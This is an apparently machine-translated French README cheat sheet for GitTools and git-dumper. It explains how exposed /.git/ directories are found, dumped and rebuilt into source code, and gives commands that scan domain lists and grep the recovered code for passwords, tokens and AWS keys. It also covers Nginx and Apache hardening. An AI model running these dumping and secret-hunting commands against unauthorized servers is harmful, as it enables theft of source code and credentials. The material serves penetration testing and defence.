<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📂 GitTools - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```
<p align="center">
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="Sécurité Web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📂 Boîte à outils essentielle pour découvrir les dossiers <code>/.git/</code> exposés sur les serveurs Web, télécharger les magasins d'objets Git bruts et reconstruire entièrement le code source d'origine et l'historique des validations</b>
</p>

---

## 📋 Table des matières

-[Vue d'ensemble et risque .git exposé] (#-overview--the-exposed-git-hazard)
- [Installation](#-installation)
- [Les trois modules GitTools](#-les-trois-modules-gittools)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2. Extracteur (`extractor.sh`)](#2-extracteur-extracteursh)
  - [3. Finder (`finder.py`)](#3-finder-finderpy)
- [Dumper Python alternatif : `git-dumper`](#-alternative-python-dumper-git-dumper)
- [Chasse aux secrets et aux informations d'identification post-reconstruction](#-post-reconstruction-secret--chasse aux informations d'identification)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et renforcement du serveur Web](#-defensive-considerations--web-server-hardening)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Aperçu et risque .git exposé

Lorsque les développeurs déploient des applications Web via `git clone` ou des scripts automatisés sans restreindre correctement l'accès aux répertoires cachés, le dossier **`/.git/`** devient accessible via HTTP/HTTPS :
`https://target.com/.git/`

Même si la liste des répertoires (indexation) est désactivée, la structure déterministe de Git permet à un attaquant de télécharger `/.git/HEAD`, `/.git/config`, `/.git/index` et de parcourir tous les objets libres de Git (`.git/objects/xx/xxxx...`). Cela permet une reconstruction complète de :
- Code source complet de l'application et API internes.
- Informations d'identification de la base de données, jetons API et clés SSH privées dans les fichiers de configuration.
- Journaux complets de validation Git, e-mails des auteurs et branches de développement.

---

## 📥Installation
```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```
---

## 🚀 Les trois modules GitTools

GitTools est organisé en trois utilitaires spécialisés :

### 1. Tombereau (`gitdumper.sh`)
Télécharge autant de répertoire `.git` que possible à partir du serveur Web :
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```
### 2. Extracteur (`extractor.sh`)
Reconstruit les fichiers originaux, les arborescences de validation et les branches à partir des objets libres `.git` vidés :
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
Dans `/tmp/extracted_source/`, chaque validation est restaurée dans un répertoire isolé contenant l'arborescence complète des fichiers à ce moment-là.

### 3. Chercheur (`finder.py`)
Analyse les listes de domaines ou les blocs CIDR pour détecter les répertoires `.git` exposés :
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```
---

## 🐍 Dumper Python alternatif : `git-dumper`

`git-dumper` est une alternative Python multithread qui reconstruit automatiquement un référentiel git actif et fonctionnel en une seule étape :
```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```
Une fois terminé, vous pouvez utiliser les commandes `git` normales dans le dossier :
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```
---

## 🔍 Chasse aux secrets et aux informations d'identification post-reconstruction

Une fois le référentiel récupéré, recherchez les informations d'identification et les fichiers cachés :
```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Dump avec git-dumper (Python)**| `git-dumper https://target.com/.git/ ./repo/` |
| **Dump avec GitTools Bash** | `./Dumper/gitdumper.sh https://target.com/.git/ ./dump/` |
| **Extraire les commits vers la source** | `./Extractor/extractor.sh ./dump/ ./source/` |
| **Analyser la liste des hôtes pour .git** | `python3 Finder/finder.py -i domains.txt` |
| **Afficher l'historique des validations** | `git log -p --color` |
| **Chassez les secrets codés en dur** | `gitleaks detect -v` |

---

## 🛡️ Considérations défensives et renforcement du serveur Web

1. **Durcissement Nginx :**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Durcissement d'Apache (`.htaccess`) :**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **Meilleures pratiques CI/CD :** Ne déployez jamais de code en clonant git directement dans la racine Web (`/var/www/html/`). Utilisez des ensembles d’artefacts propres ou des conteneurs Docker.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> GitTools et git-dumper sont conçus pour les évaluations de vulnérabilités autorisées et l'audit des infrastructures défensives. Le téléchargement de code source propriétaire à partir d'applications Web non autorisées sans autorisation est illégal.